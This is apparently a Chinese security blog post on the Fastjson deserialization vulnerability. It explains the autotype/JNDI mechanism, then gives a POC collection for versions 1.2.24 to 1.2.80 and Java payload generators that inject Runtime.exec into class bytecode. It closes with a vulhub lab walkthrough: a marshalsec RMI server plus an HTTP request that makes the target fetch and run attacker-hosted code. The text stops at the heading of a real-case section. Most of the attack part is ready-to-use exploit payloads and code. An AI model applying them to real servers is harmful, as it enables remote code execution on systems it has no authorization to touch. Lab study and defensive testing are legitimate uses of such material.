#  分享Fastjson反序列化漏洞原理+漏洞复现+实战案例+POC收集  
原创 神农Sec
                        神农Sec  神农Sec   2026-02-03 01:01  
  
扫码加圈子  
  
获内部资料  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXLicr9MthUBGib1nvDibDT4r6iaK4cQvn56iako5nUwJ9MGiaXFdhNMurGdFLqbD9Rs3QxGrHTAsWKmc1w/640?wx_fmt=jpeg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
#   
  
专注于SRC漏洞挖掘、红蓝对抗、渗透测试、代码审计JS逆向，CNVD和EDUSRC漏洞挖掘，以及工具分享、前沿信息分享、POC、EXP分享。不定期分享各种好玩的项目及好用的工具，欢迎关注。加内部圈子，文末有彩蛋（课程培训限时优惠）。  
#   
  
  
01  
  
0x1   
分享Fastjson反序列化漏洞原理+漏洞复现+实战案例+POC收集  
## 0x1 前言  
  
哈喽师傅们，这篇文章自己写之前先是看了十几篇的Fastjson反序列化漏洞相关的文章，自己也是先学习了一遍，然后才写的这篇文章，这篇文章主要是分享Fastjson反序列化漏洞原理+漏洞复现+实战案例+POC收集，然后从不同的方面去介绍和利用Fastjson漏洞，特别是在收集POC的过程中，需要我们自己去验证它。还有就是复现相关Fastjson漏洞的时候对于我们本地的一个Java和jdk环境要求比较严格，最后面呢是以之前挖EDUSRC的一个学校的案例来给师傅们分享下实战中的Fastjson漏洞怎么利用。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVAr3iauNaIdMRgLzc0CFiaedKDtLyfoNibaIfbqarPWQcScJDKRwicFA7knXebxQbjK8vZtLVZetjRIA/640?wx_fmt=png&from=appmsg "null")  
## 0x2 Fastjson反序列化漏洞原理及介绍  
### 一、浅谈  
  
Fastjson反序列化漏洞也是一个知名度比较高的Java反序列化漏洞，他是阿里巴巴的开源库，下面我将主要带大家了解Fastjson反序列化漏洞的原理以及相关知识点的内容，然后带师傅们去利用rmi服务去复现这个Fastjson反序列化漏洞。  
### 二、什么是json？  
  
json是一种数据格式，对于我们互联网来说，我们服务器和客户端有大量的数据需要进行传输。以前通用的方式是xml，但是xml数据体重太大，效率低下，所以就有了另外一种数据格式，叫json。  
  
**json一共有两种体现：**  
- json对象、json数组  
  
- json对象：json本身是一个字符串，{建：值, 建：值}  
  
举例：  
```
{
  "name" : "routing",
  "2003-11-11",
  "age" : 20,
  "likes" : ["看电影" , "看书"]
}

```  
### 三、Fastjson概述  
  
FastJson是啊里巴巴的的开源库，用于对JSON格式的数据进行解析和打包。其实简单的来说就是处理json格式的数据的。例如将json转换成一个类。或者是将一个类转换成一段json数据。  
  
Fastjson 是一个 Java 库，提供了Java 对象与 JSON 相互转换。  
- **toJSONString()方法**  
：（序列化）将json对象转换成JSON字符串；  
  
- **parseObject()方法**  
：（反序列化）将JSON字符串转换成json对象。  
  
使用方式：  
```
//序列化
String text = JSON.toJSONString(obj); 
//反序列化
VO vo = JSON.parse(); //解析为JSONObject类型或者JSONArray类型
VO vo = JSON.parseObject("{...}"); //JSON文本解析成JSONObject类型
VO vo = JSON.parseObject("{...}", VO.class); //JSON文本解析成VO.class类

```  
### 四、Fastjson漏洞原理  
  
fastjson为了读取并判断传入的值是什么类型，增加了autotype机制导致了漏洞产生。  
  
由于要获取json数据详细类型，每次都需要读取@type  
，而@type可以指定反序列化任意类调用其set  
，get  
，is  
方法，并且由于反序列化的特性，我们可以通过目标类的set方法自由的设置类的属性值。  
  
那么**攻击者只要准备rmi服务和web服务，将rmi绝对路径注入到lookup方法中，受害者JNDI接口会指向攻击者控制rmi服务器，JNDI接口从攻击者控制的web服务器远程加载恶意代码并执行，形成RCE。**  
  
【JNDI提供了查找和访问各种命名和目录服务的通用、统一的接口。支持的服务：DNS，LDAP，RMI，CORBA等】  
  
关于JNDI注入，大家可以看我之前写的一篇关于log4j的JNDI注入漏洞的详细介绍：  
  
JNDI注入原理及利用IDEA漏洞复现-CSDN博客 文章浏览阅读1k次，点赞28次，收藏25次。本篇文章我也是看过很多的博客写的，中间也遇到很多问题，JNDI注入漏洞的危害还是蛮高的。下面我们从RMI以及DNS协议进行详细的漏洞分析，其中漏洞的危害原因主要是lookup()函数可控，可以执行恶意的命令，从而造成恶意攻击。 https://blog.csdn.net/SENMINGya/article/details/136819823?spm=1001.2014.3001.5502  
### 五、Fastjson漏洞利用详解  
  
1、攻击者（我们）访问存在fastjson漏洞的目标靶机网站，通过burpsuite抓包改包，以json格式添加com.sun.rowset.JdbcRowSetImpl恶意类信息发送给目标机。  
  
2、存在漏洞的靶机对json反序列化时候，会加载执行我们构造的恶意信息(访问rmi服务器)，靶机服务器就会向rmi服务器请求待执行的命令。也就是靶机服务器问rmi服务器，（靶机服务器）需要执行什么命令啊？  
  
3、rmi 服务器请求加载远程机器的class（这个远程机器是我们搭建好的恶意站点，提前将漏洞利用的代码编译得到.class文件，并上传至恶意站点），得到攻击者（我们）构造好的命令（ping dnslog或者创建文件或者反弹shell啥的）  
  
4、rmi将远程加载得到的class（恶意代码），作为响应返回给靶机服务器。  
  
5、靶机服务器执行了恶意代码，被攻击者成功利用。  
  
这里给大家看看红队大佬的图解，希望对大家理解fastjson漏洞原理的利用有帮助。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVAr3iauNaIdMRgLzc0CFiaedEOPd7gKsU6EtR2X651t1tMhqYVd82Vl2u8CNpQ8EviaxQ2Bw5W5L4UQ/640?wx_fmt=png&from=appmsg "null")  
## 0x3 Fastjson漏洞POC收集  
### 一、Fastjson 1.2.24版本  
  
**TemplatesImpl 反序列化**  
  
最终Poc  
为  
```
{
    "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
    "_bytecodes": ["恶意字节码"],
    "_name": "test",
    "_tfactory": {},
    "_outputProperties": {},
}

```  
  
**JdbcRowSetImpl 反序列化**  
  
最终Poc  
为  
```
{  

  "@type":"com.sun.rowset.JdbcRowSetImpl",  

  "dataSourceName":"ldap://127.0.0.1:1234/Exploit",  

  "autoCommit":true  

}  

```  
### 二、Fastjson 1.2.25版本  
  
附上Poc  
```
{  

  "@type":"[com.sun.rowset.JdbcRowSetImpl;",  

  "dataSourceName":"ldap://127.0.0.1:1234/Exploit",  

  "autoCommit":true  

}  

或   

{  

  "a":{  

    "@type":"LLcom.sun.rowset.JdbcRowSetImpl;;",  

    "dataSourceName":"rmi://test.com:9999/TouchFile",  

    "autoCommit":true  

  }  

}

```  
### 三、Fastjson 1.2.42版本  
  
最终Poc  
，添加两个类描述符  
```
{  

  "@type":"LLcom.sun.rowset.JdbcRowSetImpl;;",  

  "dataSourceName":"ldap://127.0.0.1:1234/Exploit",  

  "autoCommit":true  

}

```  
### 四、Fastjson 1.2.43版本  
  
附上poc  
```
{
    "@type":"[com.sun.rowset.JdbcRowSetImpl"[,
    {"dataSourceName":"ldap://127.0.0.1:1234/Exploit",
    "autoCommit":true
}

或
{
    "b":{
        "@type":"[com.sun.rowset.JdbcRowSetImpl"[{,
        "dataSourceName":"rmi://test.com:9999/TouchFile",
        "autoCommit":true
    }
}

```  
### 五、Fastjson 1.2.45版本  
  
分析版本来到fastjson1.2.45  
，此版本升级后，存在一个黑名单匹配绕过  
，绕过类  
  
org.apache.ibatis.datasource.jndi.JndiDataSourceFactory  
  
利用条件如下  
1. 目标服务端存在mybatis  
的jar包。  
  
1. 版本需为 3.x.x ～ 3.5.0  
  
1. autoTypeSupport属性为true才能使用。（fastjson >= 1.2.25默认为false）  
  
Poc  
如下  
```
{  

  "@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",  

  "properties":{  

    "data_source":"ldap://127.0.0.1:1234/Exploit"  

  }  

}  

或  

{  

  "b":{  

    "@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",  

    "properties":{"data_source":"ldap://localhost:1389/Exploit"}  

  }  

}




```  
### 六、Fastjson <=1.2.62 和 <=1.2.66版本  
  
积累的两个poc  
,基于黑名单绕过fastjson <= 1.2.62  
```
{  "@type":"org.apache.xbean.propertyeditor.JndiConverter",  "AsText":"rmi://127.0.0.1:1099/exploit"}";

```  
  
基于fastjson<=1.2.66  
的poc  
```
{  "@type":"org.apache.shiro.jndi.JndiObjectFactory",  "resourceName":"ldap://192.168.80.1:1389/Calc"  }

```  
### 七、Fastjson 1.2.80版本  
  
构造poc  
如下，成功弹出计算器  
```
{
    "a": {
        "@type": "java.lang.Class",
        "val": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource"
    },
    "b": {
        "@type": "java.lang.Class",
        "val": "com.sun.org.apache.bcel.internal.util.ClassLoader"
    },
    "c": {
        "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
        "driverClassLoader": {
            "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
        },
        "driverClassName": "$$BECL$$$l$8b$I$A$A$A$A$A$A$AeP$bbN$CA$U$3d$D$cb$O$ac$8b$bc$c47$sV$82$854v$Q$h$a3$W$e2$pb$b4$k$c6$J$Z$5cv$c92$Y$fe$c8$9aF$8d$85$l$e0G$Z$efl$M$908$c5$7d$9c$c7$bd7$f3$fd$f3$f9$F$e0$Y$7b$k8J$k$ca$a8d$b1fs$95c$9dc$83c$93$c1m$ebP$9b$T$86t$bd$f1$c0$e0$9cFO$8a$a1$d0$d1$a1$ba$9e$M$7b$w$be$X$bd$80$90l$5b$G$7f$ca$7c$d7$I$f9$7c$rF$JE$b3$Y$bcn4$89$a5$3a$d7$89TMGG$D$f1$o$7cd$91$e3$d8$f2$b1$8d$j$9a$zE$m$7d$ec$a2$c6P$b1$7c3$Qa$bfy6$95jdt$U$d2$N$e4d$u$$$b8$9b$de$40I$c3PZ$40w$93$d0$e8$n$ad$f1$fa$ca$cc$9bj$bd$d1$f9$a7i$d1N5U$92$e1$a0$be$c4vM$ac$c3$7ek$d9p$hGR$8d$c7$z$ec$c3$a5$df$b2$_$Ff$cf$a7$e8QW$a3$cc$ug$O$df$c1fT0$acPt$T$d0$K$fd$b9$f4$o$b1$C$ab$lH$95$d3op$k_$e1$5c$ce$S$yG$ba$M$f1$d6$5b$86C$d1$n$ccM$d0$3c$z$ce$T$c2$91$eap$ac$da$b1$85$e4$8e$e2$_$M$c2$l$G$cb$B$A$A"
    }
}

```  
### 八、bit4woo师傅汇总的POC  
  
**参考文档：**  
  
https://github.com/bit4woo/code2sec.com/blob/master/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E8%B7%B5%E4%B8%83%EF%BC%9Afastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96PoC%E6%B1%87%E6%80%BB.md  
#### 1、基于com.sun.rowset.JdbcRowSetImpl的PoC1  
  
该PoC需要使用JNDI，需要搭建web服务，RMI服务或LDAP服务，利用相对麻烦。但对于检测fastjson漏洞是否存在，这个却是最简单有效的（结合DNSlog）。  
```
package fastjsonPoCs;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;

/*
 * 基于JNDI的PoC,可用的JNDI服务器有RMI，ldap。
 * 
 */
public class PoC1JNDI {
  public static void main(String[] argv){
    String xx = payload();
  }

  public static String payload(){

    //JDK 8u121以后版本需要设置改系统变量
    System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
    //LADP
    String payload1 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1389/Exploit\",\"autoCommit\":true}";
    //RMI
    String payload2 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/ref\",\"autoCommit\":true}";

    JSONObject.parseObject(payload2);
    JSON.parse(payload2);
    return payload2;
  }
}

```  
  
以上poc共有三个触发点：静态代码块(Class.forName())、类实例化、和getObjectInstance()方法。  
#### 2、基于com.sun.org.apache.bcel.internal.util.ClassLoader的PoC2  
  
这个PoC是漏洞利用时最方便的，它不需要依赖JNDI等服务，所有内容一个请求中搞定。  
```
package fastjsonPoCs;

import evilClass.*;
import com.alibaba.fastjson.JSONObject;
import com.sun.org.apache.bcel.internal.classfile.Utility;

/*
 * 基于org.apache.tomcat.dbcp.dbcp.BasicDataSource的PoC，当然也可以说是基于com.sun.org.apache.bcel.internal.util.ClassLoader的PoC
 * 前者的主要作用是触发，也就是包含Class.forName()函数的逻辑(createConnectionFactory函数中)；后者是类加载器，可以解析特定格式的类byte[]。
 * 
 * 
 * org.apache.tomcat.dbcp.dbcp.BasicDataSource ----- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-dbcp 比如tomcat-dbcp-7.0.65.jar
 * org.apache.tomcat.dbcp.dbcp2.BasicDataSource ----- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-dbcp 比如tomcat-dbcp-9.0.13.jar
 * org.apache.commons.dbcp.BasicDataSource ----- https://mvnrepository.com/artifact/commons-dbcp/commons-dbcp
 * org.apache.commons.dbcp2.BasicDataSource ----- https://mvnrepository.com/artifact/org.apache.commons/commons-dbcp2
 * 
 * 主要参考：https://xz.aliyun.com/t/2272
 */
public class PoC2dbcp {
  public static void main(String[] argv){
    String xx = payload2();
  }

  public static String payload2() {
    //payload3:https://xz.aliyun.com/t/2272
    try {
      String payload2 = "{{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"c\":{\"@type\":\"org.apache.tomcat.dbcp.dbcp.BasicDataSource\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\":\"xxxxxxxxxx\"}}:\"ddd\"}";
//      payload3 = "{{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"c\":{\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\":\"xxxxxxxxxx\"}}:\"ddd\"}";
//      payload3 = "{{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"c\":{\"@type\":\"org.apache.commons.dbcp.BasicDataSource\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\":\"xxxxxxxxxx\"}}:\"ddd\"}";
//      payload3 = "{{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"c\":{\"@type\":\"org.apache.commons.dbcp2.BasicDataSource\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\":\"xxxxxxxxxx\"}}:\"ddd\"}";
      byte[] bytecode = createEvilClass.create("evil","calc");
      String classname = Utility.encode(bytecode,true);
      //System.out.println(classname);
      classname = "org.apache.log4j.spi$$BCEL$$"+classname;
      payload2 = payload2.replace("xxxxxxxxxx", classname);

//      ClassLoader cls = new com.sun.org.apache.bcel.internal.util.ClassLoader();
//      Class.forName(classname, true, cls);
      JSONObject.parseObject(payload2);
      return payload2;
    } catch (Exception e) {
      e.printStackTrace();
      return null;
    }
  }
}

```  
#### 3、基于com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl的PoC3(来自廖新喜)  
  
这个PoC有限制，需要引用程序是如下写法：  
```
JSON.parseObject(payload3, Object.class, config, Feature.SupportNonPublicField)

```  
  
在实际的环境中基本遇不到，但其中的思路还是值得学习的。  
```
package fastjsonPoCs;

import org.apache.commons.codec.binary.Base64;
import javassist.ClassPool;
import javassist.CtClass;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

/*
 * 该poc来自于廖新喜大佬的文章：http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/
 * 基于com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl，构造的恶意类需要是继承了AbstractTranslet的。
 */
public class PoC3TemplatesImpl {
  public static void main(String[] argv){
    String xx = payload3();
  }

  public static String payload3() {
    try {
      //http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/
      String payload3 = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", \"_bytecodes\": [\"xxxxxxxxxx\"], \"_name\": \"1111\", \"_tfactory\": { }, \"_outputProperties\":{ }}";
      byte[] bytecode1 = Gadget.createEvilBytecode("calc");
      String className = TemplatesImpl.class.getName();//com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
      payload3 = payload3.replace("xxxxxxxxxx", Base64.encodeBase64String(bytecode1));

      System.out.println(payload3);
      ParserConfig config = new ParserConfig();
      Object obj = JSON.parseObject(payload3, Object.class, config, Feature.SupportNonPublicField);

      return payload3;
    } catch (Exception e) {
      e.printStackTrace();
      return null;
    }
  }
}


class Gadget {

    public static class evil extends AbstractTranslet{
      @Override
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { }

        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { }
    }

    static byte[] createEvilBytecode(final String command) throws Exception {
        ClassPool classPool = ClassPool.getDefault();

        // 获取class
        System.out.println("ClassName: " + evil.class.getName());
        final CtClass clazz = classPool.get(evil.class.getName());

        // 插入静态代码块，在代码末尾。
        clazz.makeClassInitializer().insertAfter(
                "java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\"", "\\\"") + "\");"
        );
        clazz.setName("evilxxx");//类的名称，可以通过它修改。

        clazz.writeFile("D:\\");//将生成的.class文件保存到磁盘
        // 获取bytecodes
        final byte[] classBytes = clazz.toBytecode();
        return classBytes;
    }
}

```  
## 0x4 Fastjson自动化检测插件  
### 一、BurpFastJsonScan插件  
  
这里呢我就给师傅们推荐下两款burpsuit上面的自动化检测fastjson的插件，这两个插件会对BurpSuite传进来的带有json数据的请求包进行检测，对于像我这样上班爱摸鱼的马楼来讲还是蛮适合的，哈哈哈。  
  
首先，介绍的是BurpFastJsonScan 这款插件是一个希望能节省一些渗透时间好进行划水的扫描插件，该插件会对BurpSuite传进来的带有json数据的请求包进行检测。  
  
目前的功能如下：  
- 命令回显  
  
- 远程命令执行  
  
下载链接：https://github.com/pmiaowu/BurpFastJsonScan  
  
安装这个插件也很简单，无脑操作如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVAr3iauNaIdMRgLzc0CFiaedNnfTeqft8B7l4S1b7QebGHWiakkAzVEgOgMzyhxNoFjloNLjWC8leLA/640?wx_fmt=png&from=appmsg "null")  
  
这里就来简单的介绍下他这款工具的一个检测规则吧  
- POST 的内容为json  
  
- GET 的参数内容为json  
  
- POST 的参数内容为json  
  
- Cookie 的参数内容为json  
  
```
例子:
GET, POST, Cookie 有个参数 json
json = {"aaa":"66666"}
那么就会去检测
json的这种就是请求包的内容直接就是json不带参数的那种, 也会去检测

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVAr3iauNaIdMRgLzc0CFiaedQds7rhdPzQS7icg0XyLL551qiaMOvIwvibfVvOO4uonsAsP0ekCwBrSTQ/640?wx_fmt=png&from=appmsg "null")  
### 二、FastjsonScan插件  
  
FastjsonScan插件是一个简单的Fastjson反序列化检测burp插件，其实跟上面那个使用起来都是差不多的，区别在于插件检测的效率可能不一样，两个插件我都是推荐jdk1.8的环境，其实不光的fastjson漏洞要利用jdk1.8，你在复现好多Java反序列化漏洞的时候都是需要这个版本环境的，到文末我也会给师傅们推荐一个文章，去如何安装jdk1.8的环境。  
  
工具下载链接：https://github.com/Maskhe/FastjsonScan?tab=readme-ov-file  
  
安装和使用都和上面的插件差不多，这里给师傅们看看使用FastjsonScan插件扫描结果界面：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVAr3iauNaIdMRgLzc0CFiaedObOKXjiaHhnj2jwuFu0icOaIvtoVX7y1Nd4uhul0JHodLQzcbLds8e6w/640?wx_fmt=png&from=appmsg "null")  
## 0x5 Fastjson环境搭建+漏洞复现  
### 一、环境搭建  
  
靶机：Ubantu IP 192.168.103.161 （先要安装docker，然后下载vulhub） 启动vulhub里面的fastjson环境  
  
攻击机：kali IP 192.168.103.129  
  
我们先利用Ubantu进入vulnhub靶场，进入/vulhub/fastjson/1.2.24-rce目录下，然后执行以下命令，看到done，那么就表示环境开启成功了。  
```
docker-compose up -d

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVAr3iauNaIdMRgLzc0CFiaedgyY4ictib1zvOkN6X3l4UhLFwrLfWpxUNqqeMSAtRia4CXiaQiaCKxNp5WA/640?wx_fmt=png&from=appmsg "null")  
  
查看我们ubantu中docker开启环境的端口情况，端口是8090  
```
docker ps -a

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVAr3iauNaIdMRgLzc0CFiaedHNZicaJNxYrC8G3dITpT7ju70oSSWJa1eCY2Iib2mqwkgGILOWgJaTqg/640?wx_fmt=png&from=appmsg "null")  
  
我们访问 ubantu的IP+端口，192.168.103.161:8090，得到如下的界面：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVAr3iauNaIdMRgLzc0CFiaedabvIdaaAsH29cke9Ft6jv3tGC6R0cbJs3fcHTfwVF6Z2Fp1NrbHdoQ/640?wx_fmt=png&from=appmsg "null")  
### 二、漏洞复现  
#### 1、远程创建文件  
  
一、这里要创建java代码文件，所以对环境比较严格，要保证java和javac的版本一致，且都是1.8的版本！！！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVAr3iauNaIdMRgLzc0CFiaedozopiaq3qHw4eYhZTibPtdOyYib4SoLv4E6e1dN2pSW7cdPekHPNXCGoA/640?wx_fmt=png&from=appmsg "null")  
  
二、我们先在本地把java代码文件编译好，然后再上传到攻击机：kali下保存以下代码为TouchFile.java文件  
```
// javac TouchFile.java
import java.lang.Runtime;
import java.lang.Process;

public class TouchFile {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"touch", "/tmp/successFrank"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVAr3iauNaIdMRgLzc0CFiaedSUazNm9PzwUwezj9RpjtvadJFFbfWibCqNKiaHvovlXDZibPtp4jaVFsw/640?wx_fmt=png&from=appmsg "null")  
  
三、编译.java文件，生成.class文件。  
```
javac TouchFile.java

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVAr3iauNaIdMRgLzc0CFiaedibHAnicYZ0GlvYoyUK8tMuPW1Iic808SPbHSIR1NpOOpJ5iblVJHqjuqnA/640?wx_fmt=png&from=appmsg "null")  
  
四、然后我们再把编译好的.class文件上传到攻击机kali目录下  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVAr3iauNaIdMRgLzc0CFiaedepqibcZ39gEGNL3rJTiaL0KJiaGcp9POFictsOiblxgRYb8cbcBo4bFG0Kg/640?wx_fmt=png&from=appmsg "null")  
  
五、在class文件所在的目录，Python起一个http服务。用4444端口启动http服务的命令为：  
```
┌──(root-kali)-[~/桌面/fastjson]
└─# python -m http.server 4444

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVAr3iauNaIdMRgLzc0CFiaedNR2PHa46ktCpxQjiaQdAHUbnnfGeZWdGnafnlXqFRhumn8UHs2YHpKg/640?wx_fmt=png&from=appmsg "null")  
  
六、访问kali的IP+开启http服务的4444端口，就会出现下面的页面  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVAr3iauNaIdMRgLzc0CFiaed1O8ics2zta7ms6Fx6kgoBmJPMWQTvM4VKS0wnafkU8RDB9by47tlYMw/640?wx_fmt=png&from=appmsg "null")  
#### 2、开启RMI服务  
  
一、开启rmi服务之前，我们需要利用marshalsec项目，需要用到marshalsec-0.0.3-SNAPSHOT-all.jar工具，下载链接如下：https://github.com/bkfish/Apache-Log4j-Learning/tree/main/tools  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVAr3iauNaIdMRgLzc0CFiaedrdQ8ncz2dkeNQQ27IRMYqYGKLjJW3iakO2eVRq8a3S4MibMl4Z9NhZAg/640?wx_fmt=png&from=appmsg "null")  
  
二、接下来使用marshalsec项目，启动RMI服务，监听9999端口并加载远程类TouchFile.class：  
  
开启RMI服务，命令行中的IP地址是kali攻击机开始开启http服务的地址  
```
┌──(root-kali)-[~/桌面/Apache-Log4j-Learning-main/tools]
└─# java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.103.129:4444/#TouchFile" 9999

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVAr3iauNaIdMRgLzc0CFiaedttF3pO5cibXmnrsyb1SsoicLTHuum9LL2H0EB9FP6ic8vG2oVic5Lvlia5w/640?wx_fmt=png&from=appmsg "null")  
  
三、利用burp抓取靶机ubantu（192.168.103.161:8090）的包，然后再改变抓到的包的请求方式为POST，然后再发送到Repeater中。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVAr3iauNaIdMRgLzc0CFiaeda7DdDZtPV0IU2BTkl2mmuHcCrEQAstjtvUoZmhbqeBKibHLTNL5fibEg/640?wx_fmt=png&from=appmsg "null")  
  
四、添加payload，师傅们可以参考我这个请求包的内容，因为我开始在网上找了很多，然后rmi服务监听都没有回应，都失败了。  
```
POST / HTTP/1.1
Host: 192.168.103.161:8090
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh,zh-CN;q=0.9
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/json
Content-Length: 165

{
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://192.168.103.129:9999/TouchFile",
        "autoCommit":true
    }
}

```  
  
主要是看这两个地方，圈起来的是主要payload，然后看是否成功执行了，就看返回包中是否回显500关键字。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVAr3iauNaIdMRgLzc0CFiaedq0bNp4J0RWnZ5LpNXfC9RPPAz4MTNyNVyzT6Hdkokk43caML34MH7A/640?wx_fmt=png&from=appmsg "null")  
  
然后可以看到rmi服务的监听和开启的http服务都有回应了。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVAr3iauNaIdMRgLzc0CFiaedZtHnZpmicPntCyiaeHCMjKRQO2o57ibOrgMLAysjwTic4D6QL35YREdEfA/640?wx_fmt=png&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVAr3iauNaIdMRgLzc0CFiaed17qRrrNQhiarFbqibFpp1tAibVXjoPYEiavCWXgiafBeQtKJwrI6ibEOnlibg/640?wx_fmt=png&from=appmsg "null")  
  
五、我们开始的TouchFile.java这个脚本文件，我们是让他执行touch /tmp/successFrank 目录文件，我们来看看是否执行成功了。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVAr3iauNaIdMRgLzc0CFiaedIroiaQme0RjrFFGXIrLSeH8PicqchFEuVscBdBeHrqCUoB53sy4M5Zow/640?wx_fmt=png&from=appmsg "null")  
  
详细步骤如下：  
```
1、docker ps  //找到CONTAINER ID

2、docker exec -it CONTAINER ID /bin/bash   //就可以进入CONTAINER ID当前目录下了

3、cd /tmp  

4、ls   //就可以看到创建的successFrank文件了

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVAr3iauNaIdMRgLzc0CFiaedniaanyyc4kyYqIDlG7yXOdsrqPQ0FPtRtrubHPT98VV45tq9q1deWcw/640?wx_fmt=png&from=appmsg "null")  
  
目前，我们就把漏洞复现成功了！！！  
## 0x6 实战案例分享  
  
